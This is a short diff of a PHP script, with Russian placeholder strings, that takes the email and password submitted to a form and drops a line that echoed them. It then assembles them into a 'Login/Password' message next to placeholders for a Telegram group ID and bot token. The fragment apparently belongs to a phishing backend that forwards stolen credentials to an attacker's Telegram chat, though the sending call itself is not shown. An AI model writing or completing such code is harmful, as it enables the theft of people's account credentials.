@@ -120,7 +120,6 @@
 <?php
     $login = $_POST['email'];
     $password =  $_POST['password'];
-    echo $login, $password;
     $chat_id = "ID группы";
     $token = "Токен бота";
     $message = "Логин: " . $login . "%0A" . "Пароль:" . $password;
